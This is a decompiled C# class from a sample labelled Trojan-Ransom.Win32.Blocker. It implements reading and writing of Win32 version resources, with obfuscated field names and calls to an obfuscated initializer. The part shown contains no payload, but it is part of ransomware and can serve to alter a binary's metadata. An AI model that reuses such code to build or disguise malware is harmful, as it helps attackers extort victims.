// Decompiled with JetBrains decompiler
// Type: fLaSh.Dissembler.VersionResource
// Assembly: Pass, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B2D05123-D1EE-4E11-B4EC-79932D637F25
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.ajjm-b001e2657b2764cdbd2d9790e4eb90ffd0dc35ed5746bdc109cf01610ec1d1c3.exe

using In2aXkPRwyNprNdGJT;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace fLaSh.Dissembler
{
  public class VersionResource : Resource
  {
    private ResourceTable M7o4YPfRXI;
    private Kernel32.VS_FIXEDFILEINFO HkH4MjXy8Y;
    private Dictionary<string, ResourceTable> Dce4ltJJvi;

    public ResourceTable Header
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => this.M7o4YPfRXI;
    }

    public Dictionary<string, ResourceTable> Resources
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => this.Dce4ltJJvi;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public VersionResource(
      IntPtr hModule,
      IntPtr hResource,
      IntPtr type,
      IntPtr name,
      ushort wIDLanguage,
      int size)
    {
      rbdjPoeaA1BgLlupgC.XYjXOJ9ztPdU4();
      this.M7o4YPfRXI = new ResourceTable();
      // ISSUE: explicit constructor call
      base.\u002Ector(hModule, hResource, type, name, wIDLanguage, size);
      IntPtr lpRes = Kernel32.LockResource(hResource);
      if (lpRes == IntPtr.Zero)
        throw new Win32Exception(Marshal.GetLastWin32Error());
      this.Read(hModule, lpRes);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public VersionResource()
    {
      rbdjPoeaA1BgLlupgC.XYjXOJ9ztPdU4();
      this.M7o4YPfRXI = new ResourceTable();
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void LoadFrom(string filename) => this.LoadFrom(filename, Marshal.StringToHGlobalUni("#1"), new IntPtr(16L));

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static byte[] LoadBytesFrom(string filename) => Resource.LoadBytesFrom(filename, Marshal.StringToHGlobalUni("#1"), new IntPtr(16L));

    [MethodImpl(MethodImplOptions.NoInlining)]
    public override IntPtr Read(IntPtr hModule, IntPtr lpRes)
    {
      this.Dce4ltJJvi = new Dictionary<string, ResourceTable>();
      IntPtr ptr = this.M7o4YPfRXI.Read(lpRes);
      this.HkH4MjXy8Y = (Kernel32.VS_FIXEDFILEINFO) Marshal.PtrToStructure(ptr, typeof (Kernel32.VS_FIXEDFILEINFO));
      ResourceTable resourceTable;
      for (IntPtr lpRes1 = ResourceUtil.Align(ptr.ToInt32() + (int) this.M7o4YPfRXI.Header.wValueLength); lpRes1.ToInt32() < lpRes.ToInt32() + (int) this.M7o4YPfRXI.Header.wLength; lpRes1 = ResourceUtil.Align(lpRes1.ToInt32() + (int) resourceTable.Header.wLength))
      {
        switch (new ResourceTable(lpRes1).Key)
        {
          case "StringFileInfo":
            resourceTable = (ResourceTable) new StringFileInfo(lpRes1);
            break;
          default:
            resourceTable = (ResourceTable) new VarFileInfo(lpRes1);
            break;
        }
        this.Dce4ltJJvi.Add(resourceTable.Key, resourceTable);
      }
      return new IntPtr(lpRes.ToInt32() + (int) this.M7o4YPfRXI.Header.wLength);
    }

    public string FileVersion
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => string.Format("{0}.{1}.{2}.{3}", (object) ((this.HkH4MjXy8Y.dwFileVersionMS & 4294901760U) >> 16), (object) (uint) ((int) this.HkH4MjXy8Y.dwFileVersionMS & (int) ushort.MaxValue), (object) ((this.HkH4MjXy8Y.dwFileVersionLS & 4294901760U) >> 16), (object) (uint) ((int) this.HkH4MjXy8Y.dwFileVersionLS & (int) ushort.MaxValue));
      [MethodImpl(MethodImplOptions.NoInlining)] set
      {
        uint num1 = 0;
        uint num2 = 0;
        uint num3 = 0;
        uint num4 = 0;
        string[] strArray = value.Split(".".ToCharArray(), 4);
        if (strArray.Length >= 1)
          num1 = uint.Parse(strArray[0]);
        if (strArray.Length >= 2)
          num2 = uint.Parse(strArray[1]);
        if (strArray.Length >= 3)
          num3 = uint.Parse(strArray[2]);
        if (strArray.Length >= 4)
          num4 = uint.Parse(strArray[3]);
        this.HkH4MjXy8Y.dwFileVersionMS = (num1 << 16) + num2;
        this.HkH4MjXy8Y.dwFileVersionLS = (num3 << 16) + num4;
      }
    }

    public string ProductVersion
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => string.Format("{0}.{1}.{2}.{3}", (object) ((this.HkH4MjXy8Y.dwProductVersionMS & 4294901760U) >> 16), (object) (uint) ((int) this.HkH4MjXy8Y.dwProductVersionMS & (int) ushort.MaxValue), (object) ((this.HkH4MjXy8Y.dwProductVersionLS & 4294901760U) >> 16), (object) (uint) ((int) this.HkH4MjXy8Y.dwProductVersionLS & (int) ushort.MaxValue));
      [MethodImpl(MethodImplOptions.NoInlining)] set
      {
        uint num1 = 0;
        uint num2 = 0;
        uint num3 = 0;
        uint num4 = 0;
        string[] strArray = value.Split(".".ToCharArray(), 4);
        if (strArray.Length >= 1)
          num1 = uint.Parse(strArray[0]);
        if (strArray.Length >= 2)
          num2 = uint.Parse(strArray[1]);
        if (strArray.Length >= 3)
          num3 = uint.Parse(strArray[2]);
        if (strArray.Length >= 4)
          num4 = uint.Parse(strArray[3]);
        this.HkH4MjXy8Y.dwProductVersionMS = (num1 << 16) + num2;
        this.HkH4MjXy8Y.dwProductVersionLS = (num3 << 16) + num4;
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public override void Write(BinaryWriter w)
    {
      long position = w.BaseStream.Position;
      this.M7o4YPfRXI.Write(w);
      w.Write(ResourceUtil.GetByts<Kernel32.VS_FIXEDFILEINFO>(this.HkH4MjXy8Y));
      ResourceUtil.PadToDWORD(w);
      Dictionary<string, ResourceTable>.Enumerator enumerator = this.Dce4ltJJvi.GetEnumerator();
      while (enumerator.MoveNext())
        enumerator.Current.Value.Write(w);
      ResourceUtil.WriteAt(w, w.BaseStream.Position - position, position);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void SaveTo(string filename, byte[] data) => Resource.SaveTo(filename, new IntPtr(1), new IntPtr(16L), (ushort) ResourceUtil.NEUTRALLANGID, data);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void SaveTo(string filename) => this.SaveTo(filename, new IntPtr(1), new IntPtr(16L), (ushort) ResourceUtil.NEUTRALLANGID);

    public ResourceTable this[string key]
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => this.Resources[key];
      [MethodImpl(MethodImplOptions.NoInlining)] set => this.Resources[key] = value;
    }
  }
}
